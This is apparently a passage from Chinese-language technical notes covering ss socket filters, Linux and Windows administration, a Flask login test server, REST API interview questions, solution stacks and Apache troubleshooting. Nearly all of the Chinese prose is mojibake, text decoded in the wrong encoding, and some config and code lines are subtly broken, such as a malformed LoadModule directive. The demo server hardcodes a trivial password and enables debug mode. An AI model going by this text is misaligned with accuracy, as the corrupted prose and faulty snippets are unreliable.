æŒ‡ä»¤å¯ä»¥è‡ªå·±æŒ‡å®šç¯©é¸å™¨ï¼ˆfilterï¼‰ï¼Œç¯©é¸å‡ºè‡ªå·±éœ€è¦çš„ sockets è³‡è¨Š:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># åˆ—å‡ºå¾æœ¬æ©Ÿé€£ç·šåˆ° 192.168.0.1 é€™å°ä¸»æ©Ÿçš„æ‰€æœ‰é€£ç·šï¼š</span><br><span class="line">$ ss -o state established dst 192.168.0.1</span><br><span class="line"># åˆ—å‡ºå¾æœ¬æ©Ÿé€£ç·šåˆ° 192.168.0.1 ä¸»æ©Ÿ 80 é€£æ¥åŸ çš„æ‰€æœ‰é€£ç·š</span><br><span class="line">$ ss -o state established dst 192.168.0.1:80</span><br><span class="line"># åˆ—å‡ºä¾†è‡ªæ–¼ 192.168.0.2 é€™å°ä¸»æ©Ÿçš„æ‰€æœ‰é€£ç·šï¼š</span><br><span class="line">$ ss -o state established src 192.168.0.2</span><br><span class="line"># åˆ—å‡ºæ‰€æœ‰ ssh çš„é€£ç·šï¼ŒåŒ…å«å¾æœ¬æ©Ÿå¾€å¤–çš„ ssh é€£ç·šï¼Œä»¥åŠå¾å¤–é¢é€£ç·šé€²ä¾†çš„ ssh é€£ç·šï¼š</span><br><span class="line">$ ss -o state established &#x27;( dport = :ssh or sport = :ssh )&#x27;</span><br></pre></td></tr></table></figure></li></ul></li><li>åœ¨Linuxä¸­å¦‚ä½•åˆ—å‡ºæœå‹™?<ul><li>å» &#x2F;etc&#x2F;init.d æŸ¥çœ‹</li><li>æˆ– <code>systemctl list-units --type service -all</code></li><li><code>sudo systemctl | grep running</code></li><li><code>service --status-all</code></li></ul></li><li>å¦‚ä½•æŸ¥çœ‹å·²å»ºç«‹çš„sockets<ul><li><code>systemctl list-sockets</code></li><li><code>netstat</code></li><li><code>ss</code></li></ul></li></ul><h2 id="app-æª¢æ¸¬"><a href="#app-æª¢æ¸¬" class="headerlink" title="app æª¢æ¸¬"></a>app æª¢æ¸¬</h2><p><a href="https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf">https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf</a></p><h2 id="Windows-Admin"><a href="#Windows-Admin" class="headerlink" title="Windows Admin"></a>Windows Admin</h2><ul><li>å®‰å…¨æ€§è¨­å®š<ul><li>è‹¥è¦ä½¿ç”¨ Local å®‰å…¨æ€§åŸå‰‡ä¸»æ§å°è¨­å®šè¨­å®š:<ul><li>win+R</li><li><code>secpol.msc</code></li><li>åœ¨ä¸»æ§å°è¨­å®šå®‰å…¨æ€§å‘½ä»¤ä¸‹ï¼ŒåŸ·è¡Œä¸‹åˆ—å…¶ä¸­ä¸€é …æ“ä½œï¼š<ul><li>æŒ‰ä¸€ä¸‹ [å¸³æˆ¶æ”¿ç­– &gt; ä»¥ç·¨è¼¯ <strong>å¯†ç¢¼æ”¿ç­–</strong> æˆ– <strong>å¸³æˆ¶é–å®šæ”¿ç­–</strong></li><li>æŒ‰ä¸€ä¸‹ [æœ¬åœ°åŸå‰‡ ä»¥ç·¨è¼¯ <strong>ç¨½æ ¸åŸå‰‡</strong>ã€<strong>ä½¿ç”¨è€…</strong> <strong>è¨±å¯æ¬ŠæŒ‡æ´¾</strong>æˆ– <strong>å®‰å…¨æ€§é¸é …</strong></li></ul></li></ul></li><li>è‹¥è¦ä½¿ç”¨æœ¬æ©Ÿç¾¤çµ„ç­–ç•¥ç·¨è¼¯å™¨ä¸»æ§å°è¨­å®šå®‰å…¨æ€§åŸå‰‡è¨­å®š<ul><li>win +R</li><li><code>gpedit.msc</code></li><li>åœ¨ä¸»æ§å°æ¨¹ç‹€æ¨¹ä¸­ï¼ŒæŒ‰ä¸€ä¸‹ [é›»è…¦çµ„Windows è¨­å®š ï¼Œç„¶å¾ŒæŒ‰ä¸€ä¸‹[å®‰å…¨æ€§è¨­å®šã€‚</li><li>åŸ·è¡Œä¸‹åˆ—å…¶ä¸­ä¸€é …ï¼š<ul><li>æŒ‰ä¸€ä¸‹ [å¸³æˆ¶æ”¿ç­– &gt; ä»¥ç·¨è¼¯ å¯†ç¢¼æ”¿ç­– æˆ– å¸³æˆ¶é–å®šæ”¿ç­–ã€‚</li><li>æŒ‰ä¸€ä¸‹ [æœ¬åœ°åŸå‰‡ ä»¥ç·¨è¼¯ ç¨½æ ¸åŸå‰‡ã€ä½¿ç”¨è€… è¨±å¯æ¬ŠæŒ‡æ´¾æˆ– å®‰å…¨æ€§é¸é …ã€‚</li></ul></li></ul></li></ul></li></ul><h2 id="ç¶²é æ¸¬è©¦"><a href="#ç¶²é æ¸¬è©¦" class="headerlink" title="ç¶²é æ¸¬è©¦"></a>ç¶²é æ¸¬è©¦</h2><ul><li><p>æœ‰åšéç¶²é å–®å…ƒæ¸¬è©¦å—?<br>  ä¸»è¦æ¶è¨­å°å‹çš„Flask Web Server<br>  ç„¶å¾Œæœ‰è‡ªå·±å»ºç«‹å°å‹çš„æ¸¬è©¦ç”¨çš„æœå‹™<br>  <em>test_api.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import json</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">server = flask.Flask(__name__)</span><br><span class="line">@server.route(&#x27;/login&#x27;, methods=[&#x27;get&#x27;, &#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">username = request.values.get(&#x27;name&#x27;)</span><br><span class="line">pwd = request.values.get(&#x27;pwd&#x27;)</span><br><span class="line">if username and pwd:</span><br><span class="line">if username == &#x27;xiaoming&#x27; and pwd == &#x27;111&#x27;:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 200, &#x27;message&#x27;: &#x27;Login Success&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False) </span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: -1, &#x27;message&#x27;: &#x27;Login Failed&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 10001, &#x27;message&#x27;: &#x27;Parameter cannot be empty&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">server.run(debug=True, port=8888, host=&#x27;127.0.0.1&#x27;)</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/3UFNrTT.png"><br>  <em>config.ini</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">[HTTP]</span><br><span class="line">scheme = http</span><br><span class="line">baseurl = 127.0.0.1</span><br><span class="line">port = 8888</span><br><span class="line">timeout = 10.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[EMAIL]</span><br><span class="line">on_off = on;</span><br><span class="line">subject = Auto testing Report</span><br><span class="line">app = Outlook</span><br><span class="line">addressee = M10909302@gmail.com</span><br></pre></td></tr></table></figure><p>  <em>getpathInfo.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">def get_Path():</span><br><span class="line">path = os.path.split(os.path.realpath(__file__))[0]</span><br><span class="line">return path</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;æµ‹è¯•è·¯å¾„æ˜¯å¦OK,è·¯å¾„ä¸ºï¼š&#x27;, get_Path())</span><br></pre></td></tr></table></figure><p>  åŸ·è¡Œçµæœ<br>  <img src="https://i.imgur.com/SOJEwRf.png"></p><p>  <em>readConfig.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import configparser</span><br><span class="line">import getpathInfo </span><br><span class="line"></span><br><span class="line">path = getpathInfo.get_Path()</span><br><span class="line">config_path = os.path.join(path, &#x27;config.ini&#x27;)</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(config_path, encoding=&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">class ReadConfig():</span><br><span class="line"></span><br><span class="line">def get_http(self, name):</span><br><span class="line">value = config.get(&#x27;HTTP&#x27;, name)</span><br><span class="line">return value</span><br><span class="line">def get_email(self, name):</span><br><span class="line">value = config.get(&#x27;EMAIL&#x27;, name)</span><br><span class="line">return value</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;The Baseurl Value in HTTP isï¼š&#x27;, ReadConfig().get_http(&#x27;baseurl&#x27;))</span><br><span class="line">print(&#x27;The on_off value in EMAIL is: &#x27;, ReadConfig().get_email(&#x27;on_off&#x27;</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/KyVjXZL.png"></p><blockquote><p><a href="https://itpcb.com/a/1297735">https://itpcb.com/a/1297735</a></p></blockquote></li></ul><h2 id="RESTFUL-API"><a href="#RESTFUL-API" class="headerlink" title="RESTFUL API"></a>RESTFUL API</h2><ul><li>è«‹å•ä½ å°æ–¼RESTFul Webæœå‹™çš„ç†è§£æ˜¯ç”šéº¼?<ul><li>RESTFul Web Serviceå°±æ˜¯éµå¾ªRESTé¢¨æ ¼çš„Webæœå‹™æ¶æ§‹</li><li>REST(Representational State Transfer)ä¸¦ä½¿ç”¨HTTPä¾†å¯¦è¸</li></ul></li><li>ç”šéº¼æ˜¯REST Resource?<ul><li>æ¯å€‹åœ¨RESTæ¶æ§‹åº•ä¸‹çš„å…§å®¹éƒ½ç®—æ˜¯ä¸€ç¨®è³‡æºï¼Œé€™ç¨®è³‡æºæœ‰é»åƒæ˜¯OOPå…§çš„Object</li><li>è³‡æºå¯ä»¥æ˜¯testæª”ã€HTMLé é¢ã€åœ–ç‰‡æˆ–æ˜¯å…¶ä»–å‹•æ…‹è³‡æº</li><li>REST Serveræä¾›å°æ–¼é€™äº›è³‡æºçš„å­˜å–ï¼Œä¸¦ä½¿Clientå¯ä»¥ä½¿ç”¨é€™äº›è³‡æº</li><li>æ¯é …è³‡æºéƒ½é€éURIä¾†åšæ¨™èªŒ</li></ul></li><li>ç”šéº¼æ˜¯URI?<ul><li>Uniform Resource Identidierç”¨æ–¼åœ¨RESTæ¶æ§‹ä¸­æ¨™èªŒè³‡æº</li><li><code>&lt;protocol&gt;://&lt;service-name&gt;/&lt;ResourceType&gt;/&lt;ResourceID&gt;</code></li><li>å…©ç¨®ç¨®é¡çš„URI: <code>URN</code>ã€<code>URL</code></li><li><strong>URN</strong>: Uniform Resource Name<ul><li>é€éä¸€å€‹ç¨ç‰¹ä¸”æŒä¹…çš„åç¨±ä¾†æ¨™ç¤ºè³‡æº</li></ul></li><li><strong>URL</strong>: Uniform Resource Locator<ul><li>å…·æœ‰æœ‰é—œè³‡æºä½ç½®çš„ç›¸é—œè³‡è¨Š</li></ul></li></ul></li><li>ä½ å°JAX-RSçš„ç†è§£æ˜¯ç”šéº¼?<ul><li>JAX-RS&#x3D; Java API for RESRful Web Service</li></ul></li><li>å¯ä»¥è¬›ä¸€äº›ä½ çŸ¥é“å¸¸è¦‹çš„HTTP Status Codeå—?<ul><li>1xx - ä»£è¡¨è³‡è¨Šå›è¦† (é€™å•¥?</li><li>2xx - ä»£è¡¨æˆåŠŸå›æ‡‰</li><li>3xx - ä»£è¡¨é‡æ–°å°å‘</li><li>4xx - ä»£è¡¨clientå‡ºéŒ¯</li><li>5xx - ä»£è¡¨serverå‡ºéŒ¯</li><li>200 ok</li><li>201- CREATED ç”¨åœ¨PUTæˆ–POST</li><li>304-NOT MODIFIED - ç”¨æ–¼æœ‰æ¢ä»¶çš„GETè«‹æ±‚ï¼Œä»¥æ¸›å°‘ç¶²è·¯é »å¯¬ä½¿ç”¨ï¼Œé€™å€‹responseçš„bodyè¦æ˜¯ç©ºçš„</li><li>400-BAD REQUEST -é©—è­‰éŒ¯èª¤æˆ–ç¼ºå°‘è³‡æ–™</li><li>401-UNAUTHORIZED - è«‹æ±‚ä¸­æ²’æœ‰åŒ…å«æœ‰æ•ˆèº«åˆ†èªè­‰è³‡è¨Š</li><li>403-FORBIDDEN - ç„¡æ¬Šæˆ–ç¦æ­¢å­˜å–è³‡æº</li><li>404-NOT FOUND - è³‡æºæ–¹æ³•ä¸å¯ç”¨</li><li>500-INTERNAL SERVER ERROR- ç•¶Serveråœ¨é‹è¡Œæ™‚è·³å‡ºä¸€äº›ç•°å¸¸</li><li>502-BAD GATEWAY - Serverç„¡æ³•å¾å…¶ä»–Serverä¸­ç²å¾—response</li></ul></li><li>å¯ä»¥è¬›ä¸€äº›ä½ çŸ¥é“å¸¸è¦‹çš„HTTP Methodså—?<br>  <img src="https://i.imgur.com/PBaFMYj.png"><ul><li>GET: å¾Serverä¸­æ“·å–è³‡è¨Šï¼Œä¸€ç¨®å”¯è®€çš„æ“ä½œ</li><li>POST: ç”¨ä¾†åœ¨serverä¸­å»ºç«‹è³‡æº</li><li>PUT: ç”¨ä¾†åœ¨serverä¸­æ›´æ–°ç¾æœ‰è³‡æºæˆ–å–ä»£è³‡æº</li><li>DELETE: ç”¨ä¾†åœ¨serverä¸­åˆªé™¤è³‡æº</li><li>OPTIONS: å¯ç²å–serverä¸Šç¾æœ‰è³‡æºçš„æ”¯æ´é¸é …æ¸…å–®</li><li>HEAD: èˆ‡Getç›¸åŒï¼Œä½†åªå‚³é€ç‹€æ…‹è¡Œä»¥åŠHeaderéƒ¨åˆ†</li></ul></li><li>SOAPä»¥åŠRESTä¹‹é–“çš„å·®ç•°æ˜¯ç”šéº¼?</li></ul><table><thead><tr><th>SOAP</th><th>REST</th></tr></thead><tbody><tr><td>Simple Object Access Protocol</td><td>Representatioanl State Transfer</td></tr><tr><td>ç”¨ä¾†å¯¦è¸webæœå‹™çš„å”å®š</td><td>æ˜¯ä¸€ç¨®webçš„æ¶æ§‹è¨­è¨ˆé¢¨æ ¼</td></tr><tr><td>SOAPç„¡æ³•ä½¿ç”¨REST</td><td>RESTå¯ä½¿ç”¨SOAPä½œç‚ºå¯¦è¸çš„ä¸€éƒ¨åˆ†</td></tr><tr><td>æœ‰åš´æ ¼æ¨™æº–</td><td>ä¸é ˆåš´æ ¼éµå®ˆ</td></tr><tr><td>client serveræ›´åŠ è€¦åˆ</td><td>REST Clientéˆæ´»ï¼Œä¸ä¾è³´Serveré–‹ç™¼æ–¹å¼</td></tr><tr><td>åƒ…æ”¯æ´XML</td><td>æ”¯æ´XML,JSON,MIME,Textç­‰</td></tr><tr><td>SOAPä½¿ç”¨æœå‹™ä»‹é¢ä¾†å…¬é–‹è³‡æº</td><td>ä½¿ç”¨URIä¾†é–‹æ”¾è³‡æº</td></tr><tr><td>ä½œç‚ºä¸€ç¨®å”å®šï¼Œå®ƒå®šç¾©äº†è‡ªå·±çš„å®‰å…¨æªæ–½</td><td>åƒ…æ ¹æ“šå®ƒç”¨æ–¼å¯¦ç¾çš„å”è­°ç¹¼æ‰¿å®‰å…¨æªæ–½</td></tr></tbody></table><ul><li>é–‹ç™¼RESTful web æœå‹™çš„Best Practiceæœƒæ˜¯ç”šéº¼?<ul><li>é–‹ç™¼REST APIä¸¦ç›¡å¯èƒ½ä½¿ç”¨JSONè³‡æ–™æ ¼å¼ä¸¦é€²è¡Œè³‡æ–™çš„æ¥æ”¶èˆ‡å›è¦†ï¼Œå› ç‚ºå¤§å¤šæ•¸clientèˆ‡serverä¹‹é–“éƒ½å…§ç½®äº†è¼•é¬†è®€å–èˆ‡è§£æJSONç‰©ä»¶çš„æ–¹å¼<ul><li>æ‡‰ç”¨ç¨‹å¼ä»¥JSONæ ¼å¼ä½œç‚ºResponseæ‡‰è¦å°‡Content-Typeè¨­ç‚ºapplication&#x2F;json</li><li>æŸäº›HTTP Clientç«¯æœƒå»å¯Ÿçœ‹Response Headerçš„å€¼ä¾†å»åšè§£æ</li><li>resquest headerä¸­çš„Content-Type:è¦è¨­æˆapplication&#x2F;json</li></ul></li><li><strong>åœ¨å‘½åè³‡æºendpointçš„æ™‚å€™æ‡‰è©²ä½¿ç”¨è¤‡æ•¸åè©ï¼Œè€Œä¸æ˜¯å‹•è©ï¼ŒAPI Endpointæ‡‰è¦ç°¡çŸ­ã€æ˜“æ–¼ç†è§£</strong><ul><li>ä¸ç”¨å‹•è©æ˜¯å› ç‚ºHTTP Methodä¸­å·²ç¶“æè¿°äº†è«‹æ±‚è¡Œç‚ºç‚ºä½•äº†</li><li>å¸¸ç”¨çš„HTTP Verb&#x2F;Methods: GETã€POSTã€PUTã€DELETE</li></ul></li><li>ä½¿ç”¨nestingä¾†è¡¨ç¤ºè³‡æºçš„å±¤æ¬¡çµæ§‹<ul><li>ex. GET for URI: &#x2F;authors&#x2F;:id&#x2F;address</li><li>åˆ¥å¤ªå¤šå±¤</li></ul></li><li>éŒ¯èª¤è™•ç†æ‡‰é€éè¿”å›æ‡‰ç”¨ç¨‹å¼é©ç•¶çš„error codeä¾†è™•ç†ï¼ŒRESTä¸­ä¹Ÿå®šç¾©äº†é©ç•¶çš„HTTP Status Codeå¯æ ¹æ“šä¸åŒå ´æ™¯ä¾†ä¸€èµ·ç™¼é€<ul><li>error codeè¦æ­é…é©ç•¶éŒ¯èª¤è¨Šæ¯ï¼Œå¹«åŠ©é–‹ç™¼äººå“¡ç³¾æ­£æªæ–½ï¼Œä½†åˆ¥å¤ªè©³ç´°é˜²æ­¢é§­å®¢çŸ¥é“å¤ªå¤š</li><li>400-Bad Request</li><li>401-Unauthorized</li><li>403-Forbidden</li><li>404-Not Found</li><li>500-Internal Server Error</li><li>502-Bad Gateway</li><li>503-Service Unavailable</li></ul></li></ul></li><li>ä½ äº†è§£å“ªäº›åˆ†æ•£å¼ç³»çµ±æ¶æ§‹?<ul><li>æˆ‘çŸ¥é“ç”¨ä¾†maintainä»¥åŠé‹è¡Œåˆ†æ•£æ˜¯ç³»çµ±çš„æŠ€è¡“ï¼Œå°±Kubernetes</li></ul></li><li><a href="https://searchapparchitecture.techtarget.com/definition/software-stack">é‚£ç”šéº¼æ˜¯Software Stack?</a><br>  <img src="https://i.imgur.com/NOpfrAK.png"><ul><li>æ˜¯ä¸€å †ç¨ç«‹çµ„ä»¶çš„é›†åˆï¼Œä»–å€‘å”åŒå·¥ä½œä¾†å®Œæˆæ‡‰ç”¨ç¨‹å¼çš„åŸ·è¡Œ</li><li>é€™äº›çµ„ä»¶å¯èƒ½åŒ…å«:OSã€å”å®šã€runtimeç’°å¢ƒã€Libraryã€DBå’ŒFunction Call</li><li>æ ¹æ“šæ‰€éœ€é‹è¡Œçš„æ‡‰ç”¨ç¨‹å¼ï¼Œè‡³å°‘æœƒæ˜¯OSã€DBã€æ”¯æ´ç·¨å¯«ç¨‹å¼çš„å·¥å…·å’Œæ‡‰ç”¨ç¨‹å¼</li></ul></li><li>é‚£ç”šéº¼æ˜¯Solution Stack?<ul><li>è¦é–‹ç™¼ä¸€æ¬¾ç¶²è·¯æ‡‰ç”¨ç¨‹å¼ï¼Œæœƒéœ€è¦å®šç¾©ç›®æ¨™OSã€ç¶²é serverã€DBä»¥åŠèªè¨€</li><li>æˆ–è¦å®šç¾©OSã€Middlewareã€DBåŠæ‡‰ç”¨ç¨‹å¼ï¼Œæœ‰æ™‚ä¹Ÿæœƒå°‡ç¡¬é«”æ¶µè“‹åœ¨å…§</li><li>èˆ‰ä¾‹:<ul><li>BCHS<ul><li>OpenBSD</li><li>C</li><li>httpd</li><li>SQLite</li></ul></li><li>ELK<ul><li>Elasticsearch</li><li>Logstash</li><li>Kibana</li></ul></li><li>Ganeti<ul><li>Xenæˆ–KVM</li><li>æ­é…LVMçš„Linux</li><li>DRBD</li><li>Ganeti</li><li>Ganeti Web Manager</li></ul></li><li>LAMP<ul><li>Linux</li><li>Apache</li><li>MySQL&#x2F;MariaDB</li><li>Perlã€PHPã€Python</li></ul></li><li>LAPP<ul><li>Linux</li><li>Apache</li><li>PostgreSQL</li><li>Perlã€PHPã€Python</li></ul></li><li>LLMP<ul><li>Linux</li><li>Lighttpd</li><li>MySQL&#x2F;MariaDB</li><li>Perlã€PHPã€Python</li></ul></li><li>MEAN<ul><li>MongoDB</li><li>Express.js</li><li>Angular.js</li><li>Node.js</li></ul></li><li>MERN<ul><li>MongoDB</li><li>Express.js</li><li>React.js</li><li>Node.js</li></ul></li><li>MEVN<ul><li>MongoDB</li><li>Express.js</li><li>Vue.js</li><li>Node.js</li></ul></li></ul></li></ul></li></ul><h2 id="Apache-Troubleshooting"><a href="#Apache-Troubleshooting" class="headerlink" title="Apache Troubleshooting"></a><a href="https://www.acunetix.com/websitesecurity/troubleshooting-tips-for-apache/">Apache Troubleshooting</a></h2><h3 id="httpd-conf-è¨­å®šéŒ¯èª¤"><a href="#httpd-conf-è¨­å®šéŒ¯èª¤" class="headerlink" title="httpd.conf è¨­å®šéŒ¯èª¤"></a>httpd.conf è¨­å®šéŒ¯èª¤</h3><ul><li>Syntax Error<ul><li>Linuxä¸Šéœ€ä½¿ç”¨ <code>apachectl -configtest</code>ä¾†æª¢æ¸¬Syntax Error</li><li>Windowsç³»çµ±ä¸Šçš„Apacheé ˆå…ˆåˆ°Apacheçš„binç›®éŒ„ä¸Šï¼Œç„¶å¾ŒåŸ·è¡Œ <code>httpd.exe -t</code></li><li>ä¿®æ­£å•é¡Œå¾Œé‡å•ŸApacheä¸¦é‡æ–°é€éä¸Šè¿°æŒ‡ä»¤åšæª¢æŸ¥</li></ul></li></ul><h3 id="Vulenrabilities"><a href="#Vulenrabilities" class="headerlink" title="Vulenrabilities"></a>Vulenrabilities</h3><ul><li>ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„Apache</li><li>ä½¿ç”¨å¼±æƒå·¥å…·å»æª¢æŸ¥</li><li>éš¨æ™‚æŸ¥çœ‹æœ€æ–°çš„CVEï¼Œä¸¦ä¸ŠPatch</li></ul><h3 id="Apache-HTTP-Server-Logs"><a href="#Apache-HTTP-Server-Logs" class="headerlink" title="Apache HTTP Server Logs"></a>Apache HTTP Server Logs</h3><p>æ‡‰åˆ†æApache HTTP Serverä¸­çš„<strong>error logs</strong>ï¼Œ<strong>å®ƒæä¾›äº†æœ‰é—œ Web æœå‹™å™¨ä¸Šç™¼ç”Ÿçš„ä»»ä½•éŒ¯èª¤çš„è©³ç´°è³‡è¨Š</strong> è·¯å¾‘: <code> /var/log/apache2/error.log</code>ã€<code>/etc/apache2/apache2.conf</code>ã€<code>/etc/httpd/conf/httpd.conf</code></p><p>é è¨­æœƒæ”¾åœ¨Apacheå®‰è£ç›®éŒ„ä¸­çš„logç›®éŒ„ä¸­çš„<strong>error_log</strong>æª”æ¡ˆä¸­<br>ä¹Ÿå¯å¾httpd.confä¸­å»è¨­å®šè¦ç´€éŒ„å“ªä¸€é¡å‹çš„éŒ¯èª¤ï¼Œhttpd.confä¸­æœ‰8å€‹logç´šåˆ¥çš„è³‡è¨Š<br>é™¤äº†error logä»¥å¤–é‚„æä¾›access logä¾†ç´€éŒ„Serverè™•ç†éçš„æ‰€æœ‰è«‹æ±‚ã€‚<br>é€™äº›æ—¥èªŒé‚„å¯ä»¥å°å¯èƒ½å°è‡´å•é¡Œçš„åŸå› æä¾›é¡å¤–çš„è§£é‡‹ï¼Œé‚„å¯ä»¥è£œå……éŒ¯èª¤æ—¥èªŒä¸­çš„è³‡è¨Šã€‚</p><h3 id="ä½¿ç”¨Mod-log-forensic-æ¨¡çµ„"><a href="#ä½¿ç”¨Mod-log-forensic-æ¨¡çµ„" class="headerlink" title="ä½¿ç”¨Mod_log_forensic æ¨¡çµ„"></a>ä½¿ç”¨Mod_log_forensic æ¨¡çµ„</h3><p><code>mod_log_forensic</code>æ¨¡çµ„ç”¨æ–¼æä¾›clientç«¯è«‹æ±‚çš„<strong>forensic log</strong><br>é€™åŒ…å«äº†è™•ç†å‰èˆ‡è™•ç†å¾Œçš„è«‹æ±‚ï¼Œä¸¦ä½¿ç”¨ç›¸åŒIDä¾†å¼•ç”¨ç›¸åŒçš„è«‹æ±‚ï¼Œå› æ­¤å¯ä»¥è¼•é¬†è­˜åˆ¥ç”±ç‰¹å®šè«‹æ±‚å¼•ç™¼çš„ä»»ä½•å•é¡Œ<br><strong>å¯ä»¥ç”¨ä¾†åˆ†æå“ªäº›è«‹æ±‚æœƒå°è‡´Web Serverå´©æ½°</strong><br>è‹¥è¦å•Ÿç”¨é€™å€‹æ¨¡çµ„ï¼Œéœ€è¦åœ¨ <code>Apache httpd.conf</code>æ–‡ä»¶ä¸­è¨­å®š:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LoadModule log_forensic_module_forensic.so</span><br><span class="line">LoadModule uniques_id_module modules/mod_unique_id.so</span><br><span class="line">ForensicLog logs/forensic_log</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯å°‡ <strong>check_forensic</strong>çš„bashè…³æœ¬èˆ‡ mod_log_forensicæ¨¡çµ„çµåˆä½¿ç”¨ï¼Œä»¥åˆ—å‡ºåœ¨forensic logä¸­ç™¼ç¾ä»»ä½•ä¸å®Œæ•´çš„è«‹æ±‚<br><code>check_forensic &lt;log_file&gt;</code></p><h3 id="ä½¿ç”¨-mod-whatkilledus-module"><a href="#ä½¿ç”¨-mod-whatkilledus-module" class="headerlink" title="ä½¿ç”¨ mod_whatkilledus module"></a>ä½¿ç”¨ mod_whatkilledus module</h3><p>ç•¶äº‹æƒ…éå¸¸ç³Ÿç³•ä¸”Apache Serverå´©æ½°æ™‚ï¼Œ<code>mod_whatkilledus</code>æ¨¡çµ„å¯ç”¨æ–¼ç´€éŒ„æœ‰é—œå´©æ½°çš„è©³ç´°æŠ€è¡“è³‡è¨Šä»¥åŠå°è‡´ç™¼ç”Ÿcrashçš„åŸå§‹clientç«¯è«‹æ±‚ã€‚</p><p>æ­¤å¤–è‹¥å•Ÿç”¨äº† <code>mod_backtrace</code>æ¨¡çµ„ï¼Œé€™å°‡åŒ…å«é¡¯ç¤ºæ•…éšœé»çš„å›æº¯ï¼Œé€™å°æ–¼åœ¨æ»¿è¶³æŸäº›æ¢ä»¶å¾Œä½¿ç”¨å›æº¯è¨»é‡‹éŒ¯èª¤æ—¥èªŒå¾ˆæœ‰ç”¨</p><p>å°æ–¼Unixç³»çµ±ï¼Œåªæœ‰åœ¨ httpdå»ºæ§‹ä¸­å•Ÿç”¨äº† <code>--enable-exception-hook</code> åƒæ•¸æ™‚ï¼Œé€™äº›æ¨¡çµ„æ‰æœƒèµ·ä½œç”¨ã€‚è€Œå°æ–¼Windowsç³»çµ±å‰‡æ²’æœ‰ç‰¹æ®Šè¦æ±‚</p><ul><li><code>mode_whatkilledus</code> ä»¥åŠ <code>mod_backtrace</code> çš„èªªæ˜æ–‡ä»¶: <a href="https://emptyhammock.com/projects/httpd/diag/quick-start.html">https://emptyhammock.com/projects/httpd/diag/quick-start.html</a></li></ul><h3 id="ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡çµ„"><a href="#ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡çµ„" class="headerlink" title="ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡çµ„"></a>ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡çµ„</h3><p>ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡çµ„å¯èƒ½æœƒå°è‡´åœ¨å®‰è£Apache HTTP Serveræ™‚é‡åˆ°å•é¡Œ<br>å› 